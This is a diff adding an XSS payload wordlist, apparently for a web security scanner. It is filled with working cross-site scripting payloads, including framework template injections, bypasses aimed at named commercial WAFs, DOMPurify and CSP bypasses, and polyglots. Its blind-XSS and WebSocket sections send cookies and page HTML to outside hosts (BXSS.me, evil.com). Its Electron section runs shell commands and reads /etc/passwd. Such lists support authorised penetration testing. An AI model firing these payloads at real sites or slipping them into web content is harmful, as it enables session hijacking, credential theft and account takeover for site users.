@@ -1,0 +1,307 @@
+# XSS Payloads 2025/2026 - Modern Browser Bypass & WAF Evasion
+# SecLists-2025 Compatible | Updated: January 2026
+# https://github.com/halilberkayy/SENTINEL
+
+# ============================================
+# Modern Framework Bypasses (2025/2026)
+# ============================================
+
+# React/Next.js DOM Manipulation
+<div dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(1)>'}}></div>
+<script>React.createElement('img',{src:'x',onError:()=>alert(1)})</script>
+<img src=x onError={(e)=>alert(document.domain)}/>
+
+# Vue.js 3.x Template Injection
+{{_openBlock.constructor('alert(1)')()}}
+{{$el.ownerDocument.defaultView.alert(1)}}
+{{constructor.constructor('alert(1)')()}}
+<div v-html="'<img src=x onerror=alert(1)>'"></div>
+{{$attrs.a]}}{{constructor.constructor('alert(1)')()}}
+
+# Angular 17+ Universal Bypass
+<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+{{constructor.constructor('return this')().alert(1)}}
+{{[].pop.constructor('alert(1)')()}}
+<input ng-focus="$event.view.alert(1)">
+
+# Svelte 5 Bypasses
+{@html '<img src=x onerror=alert(1)>'}
+{#snippet xss()}<script>alert(1)</script>{/snippet}
+
+# Solid.js
+innerHTML={`<img src=x onerror=alert(1)>`}
+
+# Astro Framework
+<script is:inline>alert(1)</script>
+set:html={`<img src=x onerror=alert(1)>`}
+
+# htmx Injection
+<div hx-get="javascript:alert(1)"></div>
+<div hx-on="click: alert(1)"></div>
+<div hx-on:click="alert(1)"></div>
+<button hx-on:htmx:after-request="alert(1)">X</button>
+
+# Alpine.js
+<div x-data x-init="alert(1)"></div>
+<div x-data="{ xss: '' }" x-init="xss = $el.ownerDocument.defaultView.alert(1)"></div>
+<button x-on:click="$refs.x.innerText=alert(1)">X</button>
+<div x-data @click="$dispatch('xss', { alert: alert(1) })">Click</div>
+
+# Qwik Framework
+dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(1)>'}}
+
+# ============================================
+# ES2024/2025 JavaScript Features
+# ============================================
+<script>import('data:text/javascript,alert(1)')</script>
+<script type="module">import('data:text/javascript,alert(1)')</script>
+<script type="importmap">{"imports":{"x":"data:text/javascript,alert(1)"}}</script>
+<script type="module">import 'x'</script>
+
+# Object.groupBy (ES2024)
+<script>Object.groupBy([1],()=>alert(1))</script>
+
+# Promise.withResolvers
+<script>Promise.withResolvers().promise.constructor('alert(1)')()</script>
+
+# Temporal API Abuse Attempts
+<script>Temporal?.Now?.instant().constructor?.constructor('alert(1)')()</script>
+
+# ============================================
+# Advanced DOM Clobbering (2025)
+# ============================================
+<form id="x"><input id="y"></form><img src=x onerror="x.y.ownerDocument.defaultView.alert(1)">
+<a id=defaultView><a id=defaultView name=alert href="javascript:alert(1)">X</a></a>
+<iframe name=alert srcdoc="<script>parent.alert(document.domain)</script>">
+<form id="document"><input id="domain" value="CLOBBERED"></form>
+<object id="location" data="javascript:alert(1)"></object>
+<embed id="x" name="alert" src="javascript:alert(1)">
+<img id="x" name="alert" src=x onerror="window.x(1)">
+
+# ============================================
+# 2025 WAF Bypass Techniques
+# ============================================
+
+# Cloudflare Bypass Attempts
+<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<script/src=data:,alert(1)>
+<svg/onload=\u0061lert(1)>
+<img src=x:x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
+<svg><script>/<@/>alert(1)</script>
+
+# AWS WAF Bypass
+<img src=x onerror=al\u0065rt(1)>
+<svg><animate onbegin=alert(1)>
+<math><maction actiontype="statusline#http://evil?<script>alert(1)</script>">X</maction></math>
+
+# Akamai Bypass
+<svg/onload=&#97&#108&#101&#114&#116(1)>
+<img/src=x/onerror="\x61\x6c\x65\x72\x74(1)">
+
+# ModSecurity Bypass
+<script>a]ert(1)</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<!--><script>alert(1)</script>
+<script>alert?.()??alert(1)</script>
+
+# Generic WAF Bypass
+<svg/onload=\u0061\u006c\u0065\u0072\u0074(1)>
+<img src=x onerror="window['al'+'ert'](1)">
+<script>self['al'+'ert'](1)</script>
+<script>top[/al/.source+/ert/.source](1)</script>
+<script>frames['al'+'ert'](1)</script>
+<script>Reflect.apply(alert,null,[1])</script>
+<script>Reflect.construct(Function,['alert(1)'])()</script>
+<script>[]['flat']['constructor']('alert(1)')()</script>
+<script>globalThis['al'+'ert'](1)</script>
+
+# ============================================
+# Mutation XSS (mXSS) 2025
+# ============================================
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<style><style/><script>alert(1)</script>
+<svg><style><a id="</style><img src=1 onerror=alert(1)>">
+<svg><foreignObject><![CDATA[</foreignObject><script>alert(1)</script>]]></foreignObject></svg>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+
+# DOMPurify Bypass Attempts (Check Version)
+<math><mi//xlink:href="data:x,<script>alert(1)</script>">
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'><script>alert(1)</script></svg>#x">
+<svg><animate xlink:href="#x" attributeName="href" values="javascript:alert(1)" /><a id="x"><text>X</text></a></svg>
+
+# ============================================
+# CSP Bypass (2025 Techniques)
+# ============================================
+
+# Script Gadgets
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+<script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"></script><div id=app>{{constructor.constructor('alert(1)')()}}</div>
+
+# JSONP Abuse
+<script src="/api/callback?callback=alert(1)//"></script>
+<script src="/jsonp?cb=alert(1)//"></script>
+
+# base-uri Bypass
+<base href="https://evil.com/"><script src="/malicious.js"></script>
+
+# object-src Bypass
+<object data="data:text/html,<script>alert(1)</script>">
+
+# ============================================
+# Polyglot Payloads (2025)
+# ============================================
+'"><img src=x onerror=alert(1)><!--
+jaVasCript:/*`/*`/*'/*"/**/(/* */oNcLiCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3ciMg/telerik:telerik,telerik:telerik,telerik/telerik=/telerik/oNeRror=alert(1)//>\x3e
+-->'"/></sCript><deTailS open oNToggle="alert(1)">
+'`"><\x00telerik type=image src=1 onerror=alert(1)>
+"><svg/onload=alert(1)><img/src/onerror=alert(1)>
+{{constructor.constructor('alert(1)')()}}"-alert(1)-"'"><img/src/onerror=alert(1)>
+"><input autofocus onfocus="alert(1)">
+
+# ============================================
+# Blind XSS Payloads (2025)
+# ============================================
+<script>new Image().src="https://BXSS.me/log?cookie="+document.cookie</script>
+<img src=x onerror="fetch('https://BXSS.me/log',{method:'POST',body:document.cookie})">
+<script>navigator.sendBeacon('https://BXSS.me/log',JSON.stringify({cookie:document.cookie,url:location.href}))</script>
+<svg onload="fetch('https://BXSS.me/l?c='+btoa(document.cookie))">
+'"><img src=x onerror="var i=new Image();i.src='https://BXSS.me/?'+document.domain;">
+<script>fetch('https://BXSS.me/log?html='+btoa(document.body.innerHTML))</script>
+
+# ============================================
+# PDF XSS (2025)
+# ============================================
+<embed src="data:application/pdf;base64,JVBERi0xLjMKMSAwIG9iago8PCAvVHlwZSAvQ2F0YWxvZyAvUGFnZXMgMiAwIFIgL09wZW5BY3Rpb24gPDwgL1MgL0phdmFTY3JpcHQgL0pTIChhcHAuYWxlcnQoMSkpID4+ID4+CmVuZG9iagoyIDAgb2JqCjw8IC9UeXBlIC9QYWdlcyAvS2lkcyBbMyAwIFJdIC9Db3VudCAxID4+CmVuZG9iagozIDAgb2JqCjw8IC9UeXBlIC9QYWdlIC9QYXJlbnQgMiAwIFIgPj4KZW5kb2JqCnhyZWYKMCA0CjAwMDAwMDAwMDAgNjU1MzUgZiAKMDAwMDAwMDAxNSAwMDAwMCBuIAowMDAwMDAwMTI4IDAwMDAwIG4gCjAwMDAwMDAxOTcgMDAwMDAgbiAKdHJhaWxlcgo8PCAvUm9vdCAxIDAgUiAvU2l6ZSA0ID4+CnN0YXJ0eHJlZgoyNDcKJSVFT0Y=">
+
+# ============================================
+# Electron/Desktop App XSS
+# ============================================
+<script>require('child_process').exec('calc.exe')</script>
+<img src=x onerror="require('electron').shell.openExternal('file:///etc/passwd')">
+<script>require('fs').readFileSync('/etc/passwd')</script>
+
+# ============================================
+# WebSocket XSS
+# ============================================
+<script>var ws=new WebSocket('wss://evil.com');ws.onopen=function(){ws.send(document.cookie)}</script>
+
+# ============================================
+# Service Worker Hijacking
+# ============================================
+<script>navigator.serviceWorker.register('/sw.js')</script>
+
+# ============================================
+# Shortened/Minimal Payloads
+# ============================================
+<svg/onload=alert(1)>
+<x/onclick=alert(1)>X
+<math><mi//onload=alert(1)>
+<svg><a><rect onclick=alert(1)/>
+<video><source onerror=alert(1)>
+<form><button formaction=javascript:alert(1)>X
+<svg><set to=javascript:alert(1)>
+<svg><handler onclick=alert(1)>
+
+# ============================================
+# Event Handler Comprehensive (2025)
+# ============================================
+onafterprint
+onafterscriptexecute
+onbeforeactivate
+onbeforecopy
+onbeforecut
+onbeforedeactivate
+onbeforeeditfocus
+onbeforeinput
+onbeforepaste
+onbeforeprint
+onbeforescriptexecute
+onbeforeunload
+onblur
+oncancel
+oncanplay
+oncanplaythrough
+onchange
+onclick
+onclose
+oncontextmenu
+oncopy
+oncuechange
+oncut
+ondblclick
+ondrag
+ondragend
+ondragenter
+ondragexit
+ondragleave
+ondragover
+ondragstart
+ondrop
+ondurationchange
+onemptied
+onended
+onerror
+onfocus
+onfocusin
+onfocusout
+onformchange
+onforminput
+onhashchange
+oninput
+oninvalid
+onkeydown
+onkeypress
+onkeyup
+onload
+onloadeddata
+onloadedmetadata
+onloadstart
+onmessage
+onmousedown
+onmouseenter
+onmouseleave
+onmousemove
+onmouseout
+onmouseover
+onmouseup
+onmousewheel
+onmove
+onoffline
+ononline
+onorientationchange
+onpagehide
+onpageshow
+onpaste
+onpause
+onplay
+onplaying
+onpopstate
+onprogress
+onratechange
+onreset
+onresize
+onscroll
+onsearch
+onseeked
+onseeking
+onselect
+onselectstart
+onshow
+onstalled
+onstorage
+onsubmit
+onsuspend
+ontimeupdate
+ontoggle
+ontouchend
+ontouchmove
+ontouchstart
+onunload
+onvolumechange
+onwaiting
+onwebkitanimationend
+onwebkitanimationiteration
+onwebkitanimationstart
+onwebkittransitionend
+onwheel
